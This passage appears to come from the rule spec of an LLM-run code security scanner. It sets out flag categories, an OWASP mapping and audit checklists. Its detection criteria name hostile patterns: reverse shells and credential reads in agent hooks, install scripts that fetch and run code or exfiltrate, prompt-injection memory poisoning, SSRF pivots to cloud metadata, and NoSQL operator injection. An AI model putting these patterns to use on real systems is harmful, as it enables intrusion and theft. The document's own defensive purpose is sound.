| standard-violation | P2 | A portfolio standard FAILS a P1 assertion per STEP 1D's script (`check-standards.mjs`). P1 when the app's maintainability.tier is `commercial`. Script-sourced only — never from reading code. (v7.4) |
| standard-partial | P3 | A portfolio standard reports `partial` per STEP 1D's script — non-P1 assertions failing. Script-sourced only. (v7.4) |
| standards-check-unavailable | P4 | `check-standards.mjs` is missing, errored, or exited 2, so compliance is UNKNOWN. An honest null beats a plausible guess — never substitute an LLM assessment. (v7.4) |
| route-protection-gap | P2 | Auth middleware not applied consistently |
| license-risk | P4 | GPL or restrictive license in dependencies |
| llm-code-execution | P1 | eval/exec of LLM responses |
| llm-output-unsanitized | P2 | LLM output rendered as HTML without sanitization |
| llm-prompt-injection | P1 | User input in LLM system prompts or tool schemas |
| llm-tool-no-validation | P2 | LLM tool/function calls executed without validation |
| llm-unbounded-cost | P3 | No cost/rate cap on user-triggered LLM calls |
| cdn-no-sri | P3 | CDN scripts without SRI integrity hashes |
| cicd-no-codeowners | P3 | No CODEOWNERS on CI/CD workflow files |
| cicd-pull-request-target | P1 | pull_request_target with PR checkout in GitHub Actions |
| cicd-script-injection | P1 | Script injection via github.event.* in CI run steps |
| cicd-secrets-leak | P3 | CI/CD secrets exposed as env vars (log leak risk) |
| cicd-unpinned-actions | P3 | Third-party CI actions not pinned to SHA |
| unpinned-cdn | P3 | CDN dependencies loaded with @latest |
| webhook-no-signature | P2 | Webhook endpoint without signature verification |
| path-traversal | P1 | File operations with user-controlled paths |
| template-injection | P1 | User input in template engine expressions |
| nosql-injection | P1 | Unparameterized NoSQL queries with user input, or request input reaching a query as an object enabling $ne/$gt/$regex/$where operator injection (auth bypass) |
| oauth-broad-scopes | P3 | OAuth scopes broader than necessary |
| jwt-vulnerability | P1 | JWT with weak/no signature verification |
| deserialization | P1 | Untrusted data in deserialization (JSON.parse callbacks, pickle, YAML.load) |
| privilege-escalation | P1 | Client-side role checks without server-side enforcement |
| tenant-id-from-request | P1 | Tenant/org scoping uses client-supplied ID instead of session-derived |
| error-response-leakage | P2 | API error responses include internal details (stack, code, hint) |
| serverless-memory-state | P3 | In-memory state (Map, Set, module vars) won't survive serverless cold starts |
| route-pattern-inconsistency | P3 | API routes don't follow consistent auth/error handling patterns |
| env-tracked-by-git | P1 | .env files tracked by git (secrets in repo) |
| supply-chain-install-scripts | P3 | Production dependencies with preinstall/postinstall scripts |
| session-fixation | P2 | Session not invalidated on auth state change |
| tls-verification-disabled | P2 | TLS/SSL verification disabled in production |
| token-exposure | P2 | Auth tokens in localStorage instead of httpOnly cookies |
| formatting-inconsistency | P4 | Prettier check fails or no Prettier config — inconsistent code formatting |
| auth-weak-password-policy | P2 | Auth provider allows weak passwords (short, no complexity, HIBP disabled) |
| auth-no-captcha | P2 | Sign-up CAPTCHA configured but disabled — bot abuse vector |
| auth-enumeration-enabled | P2 | Enumeration protection disabled — account discovery possible |
| auth-mfa-not-enforced | P3 | MFA available but optional on data-sensitive app |
| auth-generous-lockout | P3 | Account lockout > 20 attempts or duration < 15 minutes |
| info-leak-health-endpoint | P2 | Health/status endpoint exposes DB type, latency, or version |
| info-leak-sentry-dsn | P3 | Sentry DSN visible in page source — event flooding possible |
| info-leak-auth-config | P3 | Auth provider config publicly readable via unauthenticated API |
| cors-open-deployed | P3 | CORS wildcard verified on deployed API routes |
| deployed-header-mismatch | P2 | Security headers configured in code but not served in production |
| no-security-contact | P4 | Missing /.well-known/security.txt |
| missing-robots-txt | P4 | Missing or misconfigured robots.txt |
| ai-mcp-cve | P1/P2 | MCP server matches a known CVE in threat-db |
| ai-mcp-unpinned | P3 | MCP server uses @latest or no pinned version |
| ai-mcp-not-vetted | P2/P3 | MCP server not on Safe List, or on Risk/Unsafe sub-list |
| ai-skill-malicious | P1/P2 | Skill matches malicious_skills, malicious_authors, malicious_skill_patterns, or skill_content patterns |
| ai-hook-suspicious | P1/P2/P3 | Claude Code hook matches suspicious_patterns.hooks (network call, reverse shell, credential access, etc.) |
| ai-memory-poisoning | P1/P2 | CLAUDE.md/MEMORY.md contains prompt-injection language or invisible Unicode |
| ai-config-dangerous | P1/P2 | dangerouslySkipPermissions, wildcard Bash/Write permissions, exposed secrets in .claude/ |
| ai-claude-version-stale | P1 | Installed Claude Code version below minimum_safe_versions threshold |
| ai-threat-db-stale | P2/P3 | Threat database last updated >30 days (P3) or >90 days (P2) ago |
| ai-mcp-cve-nvd-only | P1/P2/P3 | NVD has a CVE affecting an installed MCP/skill/plugin that the community threat-db does not list |
| ai-mcp-cve-disagreement | P3 | NVD and the community threat-db disagree on fixed version, CVE existence, or severity for the same component |
| ai-memory-file-drift | critical/moderate | Hash of CLAUDE.md, MEMORY.md, or other memory file changed since prior scan with no corresponding git commit (possible memory poisoning, T002/T027) |
| missing-dmarc | moderate | No DMARC TXT record at `_dmarc.<domain>` — email spoofing possible |
| dmarc-policy-none | moderate | DMARC record exists but `p=none` (monitoring only, no enforcement) |
| missing-spf | moderate | No SPF (`v=spf1`) record in apex TXT — email spoofing possible |
| missing-dkim | moderate | No DKIM record under any common selector — outbound mail may fail downstream auth |
| missing-caa | maintenance | No CAA record — any CA can issue certificates for the domain |
| excess-service-role-surface | moderate | Supabase service_role key referenced in > 2 files — each reference is a full-RLS-bypass leak vector |
| stripe-webhook-unverified | critical | Stripe webhook handler parses body without calling `stripe.webhooks.constructEvent` — signature not verified |
| gha-unpinned-action | moderate | GitHub Action `uses:` not pinned to a commit SHA — vulnerable to supply-chain compromise of the action |
| llm-output-dom-render | critical | File imports LLM SDK AND uses dangerouslySetInnerHTML/innerHTML/unsanitized markdown — customer-influenced LLM output may flow into DOM (indirect prompt injection → XSS) |
| missing-audit-log | moderate | Commercial/financial app has no audit_log/changelog/history table — disputed changes have no evidence trail |
| missing-period-lock | moderate | Financial app has no period-locking trigger — closed-period records freely modifiable (audit/tax risk) |
| llm-spend-cap-unverified | maintenance | Reminder: verify spending cap is set in the LLM provider's console (Anthropic/OpenAI) |
| unauthenticated-cron | critical | Cron route has no auth gate — anyone hitting the URL triggers the job |
| unauthenticated-webhook | critical | Webhook handler doesn't verify request signature — attacker can forge or replay events |
| cors-origin-reflection | critical | API reflects arbitrary `Origin` header AND sends `Access-Control-Allow-Credentials: true` — attacker site can read authenticated API responses from victim's browser |
| ssrf-user-url-fetch | critical | User-controlled URL flows into fetch/axios/got without allowlist or private-IP block — attacker pivots to cloud metadata (169.254.169.254), localhost, or RFC1918 ranges |
| webhook-replay-unprotected | critical | Webhook signature verified but no timestamp tolerance and no idempotency store — captured valid webhook can be replayed indefinitely |
| open-redirect-unvalidated | critical | Redirect target derives from query/body without same-origin or allowlist validation — phishing primitive after login/reset flows |
| path-traversal-file-read | critical | User-controlled file path flows into readFile/sendFile/createReadStream without `path.resolve` + base-dir check — attacker reads server files via `../` |
| prototype-pollution-merge | moderate | Deep merge (lodash.merge, deepmerge, Object.assign) blends `req.body` into target without blocking `__proto__`/`prototype`/`constructor` keys |
| public-sensitive-endpoint | critical | Framework / config / source-control file accessible via deployed URL (`/.env`, `/.git/HEAD`, `/backup.sql`, `/actuator`, etc.) |
| auth-endpoint-no-rate-limit | moderate | Auth route (login/signup/reset/otp) has no rate-limiting or captcha — credential-stuffing attacker can try unlimited combos |
| swallowed-exception | moderate | catch/except block neither logs, rethrows, nor surfaces the error — failures vanish silently (P2 on auth/payment/webhook/data-write paths) |
| unbounded-growth | moderate | Module-level Map/Set/array written from request handlers with no eviction — memory grows until the process dies (P2 when attacker-growable on a long-running server) |
| stale-docs | maintenance | Hand-written docs contradict reality: dead dev commands, references to deleted files, SESSION-HANDOFF behind the commit history. Emitted by scans/check_docs_freshness.py (deterministic script, one consolidated flag per project) — not by LLM judgment. |
| unsigned-tenant-binding | critical | Org/tenant/owner id decoded from an unsigned client source (base64 blob, OAuth state, unverified JWT, cookie) and used to target a DB write — forgeable cross-tenant write. (v7.1) |
| oauth-state-not-verified | critical | OAuth callback exchanges `code` without verifying `state` against a stored value — login-CSRF / code injection. Library-delegated flows (supabase-js, NextAuth, passport) exempt. (v7.1) |
| oauth-pkce-missing | P4 | Advisory: confirmed public OAuth client (secretless token exchange) performs the code flow without PKCE. Confidential clients never flagged. (v7.1) |
| static-admin-bearer | P1/P2/P3 | Privileged/admin/cron route gated solely by a static env-var bearer (no per-user identity); notes timing-unsafe comparison. Severity by CALLER MODEL, not by the compare: P1 human-reachable or cross-tenant, P2 machine-only but mutating/data-returning, P3 machine-only and inert. (v7.1, tiered v7.5) |
| csv-formula-injection | moderate | CSV/XLSX export writes user free-text into cells without neutralizing leading `= + - @` — formula executes in Excel/Sheets. Escalates if exports cross org boundaries. (v7.1) |
| token-in-logs | critical | Log call receives an actual token/secret value or token-bearing object — secrets persist in function/platform logs. (v7.1) |
| verbose-vendor-logging | moderate | PROVISIONAL (Watch List only): unbounded third-party response body logged wholesale — PII/serials/signed URLs may leak even without a token present. Wobbles run-to-run; pending hybrid script. (v7.1) |
| external-redirect-fetch-unvalidated | moderate | PROVISIONAL (Watch List only): server follows a URL from an external API response (Location/links/nextPage) with an auth header attached and no host allowlist — SSRF / token exfiltration. Pure-prompt produced false negatives via partner-trust; pending hybrid script. (v7.1) |
| rls-write-side-coverage | moderate | PROVISIONAL (Watch List only): table has SELECT policies but no INSERT/UPDATE/DELETE policy while written via the RLS-enforced client. Needs usage context. (v7.1) |
| mass-assignment | moderate | PROVISIONAL (Watch List only): `req.body` written wholesale into a DB write with no field allowlist — caller can set unintended columns. (v7.1) |
| trusted-client-header | critical | PROVISIONAL (Watch List only): authz/tenant decision read from a client-supplied custom header instead of the session — trivially forgeable. (v7.1) |
| malicious-install-script | P1 | Dependency install script (pre/post/install) does a dangerous combination — remote fetch + execution, credential read + network exfil, or obfuscation + execution. Install-time RCE / supply-chain malware. The dangerous subset of supply-chain-install-scripts; emitted instead of it, never both. (v7.2) |
| dependency-confusion | moderate | PROVISIONAL (Watch List only): scoped/internal dependency with no private-registry pin — possibly claimable on the public registry (Birsan). Needs a registry-ownership lookup the prompt can't do; pending candidate-generation script. (v7.2) |
| typosquat-dependency | moderate | PROVISIONAL (Watch List only): dependency name within edit-distance 1–2 of a popular package — possible typosquat. Pending candidate-generation script. (v7.2) |

---

## OWASP TOP 10 MAPPING (v6.7 addition)

Each flag category maps to an OWASP Top 10 (2021) category where applicable. For each flag emitted in STEP 2 JSON output, include an optional `owasp` field with the OWASP category code (e.g., `"owasp": "A05"`) when the flag's category appears in the mapping below. AI supply-chain flags (`ai-*`) and project-hygiene flags (`missing-readme`, `file-over-500`, `license-risk`) don't map to OWASP — omit the field for those.

Reference: https://owasp.org/Top10/ (© OWASP Foundation, CC BY-SA 4.0)

### OWASP Top 10 (2021) categories
- **A01** — Broken Access Control
- **A02** — Cryptographic Failures
- **A03** — Injection
- **A04** — Insecure Design
- **A05** — Security Misconfiguration
- **A06** — Vulnerable and Outdated Components
- **A07** — Identification and Authentication Failures
- **A08** — Software and Data Integrity Failures
- **A09** — Security Logging and Monitoring Failures
- **A10** — Server-Side Request Forgery

### Watchtower category → OWASP mapping

| Watchtower category | OWASP |
|---|---|
| hardcoded-secrets | A02 |
| hardcoded-config | A05 |
| secrets-in-git | A02 |
| no-auth | A01 |
| weak-auth | A07 |
| permissive-rules | A01 |
| no-rls | A01 |
| localstorage-sensitive | A02 |
| cors-open | A05 |
| cors-origin-reflection | A05 |
| no-rate-limiting | A04 |
| no-input-validation | A03 |
| source-maps-exposed | A05 |
| npm-cve-critical | A06 |
| npm-cve-high | A06 |
| npm-cve-moderate | A06 |
| xss-innerhtml | A03 |
| xss-dangerously | A03 |
| xss-eval | A03 |
| xss-document-write | A03 |
| sql-injection | A03 |
| csrf-missing | A01 |
| missing-csp | A05 |
| missing-hsts | A05 |
| missing-x-frame | A05 |
| missing-x-content-type | A05 |
| missing-referrer-policy | A05 |
| cookies-no-httponly | A02 |
| cookies-no-secure | A02 |
| cookies-no-samesite | A05 |
| file-upload-no-validation | A04 |
| env-exposure | A05 |
| public-repo-secrets | A02 |
| admin-creds-querystring | A07 |
| ssrf-risk | A10 |
| ssrf-user-url-fetch | A10 |
| deprecated-packages | A06 |
| debug-logging | A09 |
| missing-env-example | — |
| missing-readme | — |
| missing-gitignore | A05 |
| file-over-500 | — |
| stack-trace-leakage | A09 |
| open-redirect | A01 |
| open-redirect-unvalidated | A01 |
| exposed-env-in-build | A02 |
| outdated-runtime | A06 |
| runtime-declaration-mismatch | — |
| route-protection-gap | A01 |
| license-risk | — |
| cdn-no-sri | A08 |
| unpinned-cdn | A08 |
| gha-unpinned-action | A08 |
| supply-chain-install-scripts | A08 |
| malicious-install-script | A08 |
| dependency-confusion | A08 |
| typosquat-dependency | A08 |
| missing-dmarc | A05 |
| dmarc-policy-none | A05 |
| missing-spf | A05 |
| missing-dkim | A05 |
| missing-caa | A05 |
| excess-service-role-surface | A07 |
| stripe-webhook-unverified | A08 |
| webhook-replay-unprotected | A08 |
| llm-output-dom-render | A03 |
| missing-audit-log | A09 |
| missing-period-lock | A09 |
| swallowed-exception | A09 |
| llm-spend-cap-unverified | — |
| unauthenticated-cron | A01 |
| unauthenticated-webhook | A01 |
| path-traversal-file-read | A01 |
| prototype-pollution-merge | A03 |
| public-sensitive-endpoint | A05 |
| auth-endpoint-no-rate-limit | A07 |
| ai-mcp-cve | — |
| ai-mcp-unpinned | — |
| ai-mcp-not-vetted | — |
| ai-skill-malicious | — |
| ai-hook-suspicious | — |
| ai-memory-poisoning | — |
| ai-config-dangerous | — |
| ai-claude-version-stale | — |
| ai-threat-db-stale | — |
| ai-mcp-cve-nvd-only | — |
| ai-mcp-cve-disagreement | — |
| ai-memory-file-drift | — |
| unsigned-tenant-binding | A01 |
| oauth-state-not-verified | A07 |
| oauth-pkce-missing | A07 |
| static-admin-bearer | A01 |
| csv-formula-injection | A03 |
| token-in-logs | A09 |
| verbose-vendor-logging | A09 |
| external-redirect-fetch-unvalidated | A10 |
| rls-write-side-coverage | A01 |
| mass-assignment | A01 |
| trusted-client-header | A01 |

### Notes on the mapping
- **Dual mappings**: a few categories arguably touch two OWASP categories (e.g., `no-rate-limiting` is both A04 Insecure Design and an enabler of A07 auth attacks). The table picks the primary category; secondary mappings can be added in a future revision if users care.
- **`—` means no OWASP mapping applies.** These are real flags but don't fit OWASP's web-app threat taxonomy — they're either AI-supply-chain (a category OWASP hasn't formalized yet) or project hygiene (file size, missing docs).
- **OWASP Top 10 versions**: This mapping uses 2021. When OWASP publishes a new revision, the mapping needs revisiting — file an issue.

### Use in scan output

In STEP 2 JSON, add the `owasp` field to each flag object where applicable:

```json
{
  "text": "User-controlled URL flows into fetch at api/proxy.js:14 without allowlist",
  "severity": "critical",
  "category": "ssrf-user-url-fetch",
  "confidence": 0.95,
  "owasp": "A10",
  "fix": "Validate hostname against allowlist before fetch"
}
```

For dashboard rendering, the OWASP category can be used as a secondary grouping axis alongside severity — e.g., "show me all A02 Cryptographic Failures across the portfolio" answers a different question than "show me all critical flags."

---

## DATA INTEGRITY RULES — check for ALL of the following in migrations, schema files, API routes, and client code:

Foreign Keys:
- Check Supabase migrations or schema.sql for REFERENCES constraints
- Check if cascade rules (ON DELETE CASCADE, ON DELETE SET NULL, ON DELETE RESTRICT) are defined
- Flag any table with a _id column that has no foreign key constraint

Audit Trail:
- Look for an audit_log, changelog, or history table
- Check for database triggers that log changes (BEFORE UPDATE, AFTER DELETE triggers)
- Check if financial/important tables have any change tracking mechanism
- Flag if data-modifying operations have no record of what changed, who changed it, or what the old value was

Mutation Verification:
- Check if Supabase .insert()/.update()/.delete() results are checked for empty arrays (silent RLS failures)
- Check if Firestore write results are verified
- Look for any pattern like checkMutationResult(), throwIfEmpty(), or result.length === 0 checks after writes
- Flag if mutations are fire-and-forget with no result verification

Computed Columns:
- Check for PostgreSQL GENERATED ALWAYS AS columns in migrations/schema
- Flag any balance, total, or derived value that is calculated only in JavaScript and stored separately from its source data
- Note where calculation drift could occur (JS computes a value that should match database state)

Period/Record Locking:
- Check for any mechanism that prevents editing past/closed periods (fiscal years, months)
- Check for immutable records (tables with no UPDATE or DELETE RLS policies)
- Flag financial tables where historical data can be freely modified

---

## SECURITY POSTURE RULES — check for ALL of the following:

Security Headers:
- Check next.config.js, vercel.json, netlify.toml, or middleware for security headers
- Check for helmet.js or similar security header middleware
- Look for Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options, Referrer-Policy
- If using Next.js, check for headers() in next.config.js or middleware.ts

Cookie Security:
- Search for cookie-setting code: res.setHeader('Set-Cookie'), cookies().set(), setCookie()
- Check for httpOnly, secure, sameSite flags on auth/session cookies
- Check next-auth or auth.js config for cookie settings
- Check Supabase client config for cookie options

XSS Vectors:
- Count occurrences of dangerouslySetInnerHTML in .jsx/.tsx files
- Count innerHTML assignments in .js/.ts files
- Check for eval() or new Function() with dynamic input
- Check for document.write() usage

Environment Variable Exposure:
- List all NEXT_PUBLIC_* and VITE_* variables
- Flag any that contain: SECRET, KEY, TOKEN, PASSWORD, PRIVATE, SERVICE_ROLE (case insensitive)
- These are exposed to the client bundle and should not contain secrets

SQL Injection:
- Check for raw SQL string concatenation: `SELECT * FROM ${table}` or "SELECT * FROM " + userInput
- Verify parameterized queries are used: supabase.from().select() is safe, but .rpc() with string concat is not
- For Prisma, check for $queryRaw with template literals

CSRF Protection:
- Check for CSRF token generation and validation on POST/PUT/DELETE routes
- Look for csrf, xsrf, or anti-forgery middleware
- Next.js server actions have built-in CSRF protection — note if using server actions

File Upload Validation:
- Check for file type validation (accept attribute, MIME type checking)
- Check for file size limits
- Check for filename sanitization
- Flag direct-to-storage uploads without server-side validation

---

## EXPLOITATION-ORIENTED ANALYSIS

For each XSS vector found (innerHTML, dangerouslySetInnerHTML, eval, document.write):
- Trace the data source: is it user-controlled input or app-generated content?
- Only flag as P1/P2 if user input can reach the sink
- If app-generated only, note as "accepted" with justification
- React/Angular JSX without dangerouslySetInnerHTML is safe — do not flag
- For each flagged vector, include the file path and line number in the flag text

---

## AUTHORIZATION LOGIC REVIEW

- Check if admin-only UI is protected by server-side checks (not just client-side is_admin flags) → category: privilege-escalation
- Check if RLS policies have recursive self-references that could be exploited → category: permissive-rules
- Check if any API route accepts a user_id parameter that could be swapped for another user's ID → category: privilege-escalation
- Check for cross-tenant data access: can user A see user B's data by manipulating request params? → category: privilege-escalation
- Check for step-skipping in multi-step flows (e.g., skipping payment, skipping verification) → category: no-auth

---

## INPUT FLOW ANALYSIS

- Identify all user input sources: URL params, form fields, file uploads, query strings, cookies, request headers
- For each input source, trace where it goes: database query? HTML render? file path? redirect URL? shell command?
- Flag any input that reaches a dangerous sink without sanitization/validation
- Specifically check: Supabase .rpc() calls with string concatenation, dynamic redirect URLs (?redirect=, ?next=), file path construction from user input
- For each dangerous flow found, add to the inputFlows array in JSON output

---

## SESSION & TOKEN SECURITY

- Check if JWTs are verified server-side (not just decoded without signature check) → category: jwt-vulnerability
- Check if token expiration is enforced → category: jwt-vulnerability
- Check if refresh tokens are rotated after use → category: session-fixation
- Check if logout actually invalidates the session server-side (not just clearing localStorage) → category: session-fixation
- Check if Supabase/Firebase session tokens are stored in httpOnly cookies vs localStorage → category: token-exposure
- Check for session fixation: is session ID regenerated after login? → category: session-fixation

---

## CONFIDENCE SCORING

Every flag MUST include a confidence score (0.0-1.0):
- 0.9-1.0: Certain exploit path identified
- 0.8-0.9: Clear vulnerability pattern with known exploitation methods
- 0.7-0.8: Suspicious pattern requiring specific conditions to exploit
- Below 0.7: Do NOT include the flag — too speculative

Flags with confidence below 0.8 go to a "Watch List" subsection in CLAUDE.md instead of Active Flags.

---

## ACCEPTED RISK PRESERVATION

When scanning a project that has an existing CLAUDE.md:
- Check the Accepted Risks section for previously accepted flags
- If a flag category was previously accepted and the code has not changed, preserve status as "accepted" with original justification
- New flags always start as "active"
- Do not re-flag accepted risks unless the code materially changed

---

## CI/CD PIPELINE SECURITY

If .github/workflows/ or .gitlab-ci.yml exists, check for:
- Unpinned third-party actions (uses: owner/action@vN instead of @sha256) → category: cicd-unpinned-actions
- `pull_request_target` trigger with checkout of PR code (fork PRs get write access) → category: cicd-pull-request-target
- Script injection via `${{ github.event.issue.body }}` or similar in `run:` steps → category: cicd-script-injection
- Secrets passed as env vars that could leak in logs (grep for env: lines containing secrets.*) → category: cicd-secrets-leak
- No CODEOWNERS protection on .github/workflows/ directory → category: cicd-no-codeowners

If no CI/CD config exists, skip this section.

---

## WEBHOOK & INTEGRATION SECURITY

For each file containing webhook, hook, or callback route patterns:
- Check whether the handler also contains signature verification (hmac, verify, digest, x-hub-signature, stripe-signature, svix)
- Files with webhook routes but NO signature verification → category: webhook-no-signature
- Check for TLS verification disabled: verify=False, VERIFY_NONE, InsecureSkipVerify, NODE_TLS_REJECT_UNAUTHORIZED=0 → category: tls-verification-disabled
- Check OAuth configurations for overly broad scopes → category: oauth-broad-scopes

---

## LLM & AI SECURITY

If the project uses AI/LLM APIs (check for imports of anthropic, openai, @anthropic-ai/sdk, @ai-sdk, langchain, or any AI-related packages):
- User input flowing into system prompts or tool schemas (string interpolation near prompt construction) → category: llm-prompt-injection
- LLM output rendered as HTML without sanitization (dangerouslySetInnerHTML, innerHTML, v-html with AI response data) → category: llm-output-unsanitized
- eval() or exec() processing AI/LLM responses → category: llm-code-execution
- AI API keys hardcoded in source (not env vars) → category: hardcoded-secrets
- No cost/rate limiting on LLM API calls (unbounded user-triggered AI requests) → category: llm-unbounded-cost
- Tool/function calling without validating what the LLM requested before executing → category: llm-tool-no-validation

If no AI/LLM packages detected, skip this section.

---

## MULTI-TENANT DATA ISOLATION

For apps where multiple users or organizations share the same database (check for org_id, team_id, tenant_id, workspace_id patterns in schema or API routes):

- Trace every data query in API routes. Identify the tenant identifier (org_id, user_id, team_id, etc.)
- Check whether it is derived from the **authenticated session/token** (safe) or from **request parameters** — query string, body, URL params (unsafe) → category: tenant-id-from-request
- For Supabase: check if `org_id` comes from `auth.profile.org_id` or from `req.body.orgId` / `req.query.orgId`
- For Firebase: check if queries filter by `auth.uid` from the Firebase Auth token or by a user-supplied UID
- For Prisma/raw SQL: check if tenant filtering uses session-derived values or request-supplied values
- This is the #1 multi-tenant vulnerability — if any route uses a client-supplied tenant ID to scope data, user A can pass user B's ID and see their data
- Also check: are all data mutations (INSERT, UPDATE, DELETE) filtered by the tenant ID? Missing the filter on even one route creates cross-tenant access

If the app is single-tenant (no org/team concept), skip this section.

---

## ERROR RESPONSE SANITIZATION

Check API route error handlers (catch blocks, error middleware, 500 responses):

- When a server error occurs, does the response include internal details? Look for patterns like:
  - `res.json({ error: error.message })` or `res.json({ message: err.message, stack: err.stack })`
  - `{ error: 'Server error', code: error.code, hint: error.hint, details: error.details }`
  - Stack traces, SQL error text, file paths, or Supabase/Firebase internal error objects forwarded to client
- Safe patterns: `res.json({ error: 'Server error' })` with details logged server-side only
- Flag as `error-response-leakage` when internal error properties are forwarded to the HTTP response
- This is P2 because leaked error details help attackers understand your stack, database schema, and query patterns

---

## SERVERLESS COMPATIBILITY

Detect the deployment platform from vercel.json, netlify.toml, serverless.yml, or package.json scripts. If the app deploys to a serverless platform (Vercel, Netlify, AWS Lambda, Google Cloud Functions, Azure Functions):

- Search for in-memory state patterns that won't persist across invocations:
  - `new Map()` or `new Set()` at module level used for caching or rate limiting
  - Module-level variables (`let requestCount = 0`, `const cache = {}`) used to track state across requests
  - `setInterval` or `setTimeout` for cleanup tasks (these won't fire in short-lived functions)
- Specifically check rate limiter implementations: if they use in-memory storage (Map, object, variable) instead of external stores (Redis, Upstash, DynamoDB), the rate limiter resets on every cold start and provides zero protection → category: serverless-memory-state
- Also flag: in-memory session stores, in-memory queues, long-running background tasks that exceed function timeout limits

If the app is NOT on a serverless platform (Express on a VM, Docker, etc.), skip this section.

---

## API ROUTE PATTERN CONSISTENCY

Sample all API routes (or 10+ if there are many). For each route, check:

- Does it apply authentication middleware? (requireAuth, getSession, verifyToken, etc.)
- Does it validate input? (Zod, Yup, validateInput, joi, etc.)
- Does it sanitize error responses? (generic message vs leaked internals)
- Does it apply rate limiting?

Flag `route-pattern-inconsistency` (P3) if:
- Some routes apply auth middleware and others skip it without documented reason (e.g., public endpoints are fine, but a data-modifying route without auth is not)
- Error handling is inconsistent — some routes return `{ error: 'Server error' }` while others return `{ error: err.message, stack: err.stack }`
- Input validation is applied to some routes but missing on others that accept the same kind of data

This catches architectural drift — common in AI-generated codebases where different features were built in different sessions with different patterns.

---

## INCIDENT RESPONSE GUIDANCE

When a leaked secret (secrets-in-git) is found, include this playbook in the flag's fix field:
1. REVOKE the credential immediately via the provider's dashboard
2. ROTATE — generate a new credential
3. SCRUB history — use git filter-repo or BFG Repo-Cleaner to remove from all commits
4. FORCE-PUSH the cleaned history (coordinate with team)
5. AUDIT the exposure window — when committed? when removed? was repo public during that time?
6. CHECK provider audit logs for unauthorized usage during exposure

---

## VARIANT ANALYSIS

When a vulnerability is confirmed (confidence >= 0.9), search the entire codebase for the same pattern:
- One SQL injection → search all files for similar raw query patterns
- One missing auth check → search all route handlers for the same gap
- One unsanitized output → search all render paths for the same pattern
Report variants as additional flags linked to the original: "Variant: same pattern as [original finding]"

---

## CODE METRICS RULES:
- Exclude node_modules, .next, dist, build, package-lock.json from all counts
- Count components as files in src/components/ or similar component directories
- Count pages as files in src/pages/, src/app/, or pages/ directories
- Count API routes as files in pages/api/, src/app/api/, or api/ directories
- For largestFiles, list the top 10 by line count
- For filesOver500Lines, flag anything that should probably be split

---

## STRUCTURE RULES:
- For dataFlow, trace the path: external source → fetch/query → state management → component render
- For externalCalls, include the URL pattern, HTTP method, and what triggers each call
- For duplication, look for similar fetch patterns, repeated UI components, or copy-pasted logic across files

---

## URL EXTRACTION RULES:
- Check vercel.json for "alias" or "domains" fields
- Check package.json for "homepage" field
- Check for CNAME file in root or public/
- Prefer custom domains over *.vercel.app URLs
- Return null if no deployed URL can be determined

---

## GUARDRAILS RULES — for CLAUDE.md generation:

Always include these 9 universal guardrails:
1. Never hardcode API keys or secrets — use `.env` + `.env.example` from first commit
2. Every API route needs CORS origin validation, input validation, and auth
3. Write RLS/Firestore rules the same day you create a table
4. Never use `innerHTML` with dynamic data — use `textContent` or framework escaping
5. API proxies must restrict destination URLs with an allowlist (SSRF prevention)
6. Auth cookies must contain signed claims (HMAC), not plain booleans
7. If a secret was ever committed to a public repo, rotate it immediately
8. No `console.log` with sensitive data in production
9. Run `npx prettier --write .` before committing — keep a `.prettierrc` in the repo root

Generate project-specific guardrails from scan flags:
- Files over 1500 lines → "Do not add to {filename} ({N} lines) — split before adding features"
- innerHTML usage → "Use textContent instead of innerHTML ({N} existing XSS vectors)"
- Missing auth on API routes → "Add authentication before creating new data-modifying endpoints"
- Open CORS (Access-Control-Allow-Origin: *) → "Restrict CORS origin on any new API routes"
- No rate limiting → "Add rate limiting to any new API endpoints"
- Supabase without mutation checks → "All Supabase writes must verify result is not empty (silent RLS failures)"
- No .env.example → "Create .env.example before adding new environment variables"
- Missing security headers → "Add CSP, HSTS, X-Frame-Options headers before deploying new routes"
- Tenant ID from request params → "All data queries MUST use tenant ID from authenticated session, never from request parameters"
- Error response leakage → "API error responses must return generic messages only — log details server-side"
- Serverless memory state → "Do not use in-memory Map/Set/variables for rate limiting or caching on serverless — use Redis/Upstash"
- Route pattern inconsistency → "All API routes must follow the same auth → validate → handle → sanitize-error pattern"
- Prettier `--check` fails in THIS scan → "formatting-inconsistency" P4 flag (confidence 1.0): flag text must quote the exact count from Prettier's "Code style issues found in N files" output; fix: "Run `npx prettier --write .` to fix"
- No .prettierrc or prettier config in package.json → do NOT emit formatting-inconsistency (we only flag failing checks against an intended style, not absence of one). Note `prettierConfigFound: false` in the metrics instead.
- P1/P2 flags with exploit text → include the exploit scenario in the Active Flags table description
- Flags with confidence below 0.8 → list under a 'Watch List' subsection instead of Active Flags

If flags array is empty, use []
```
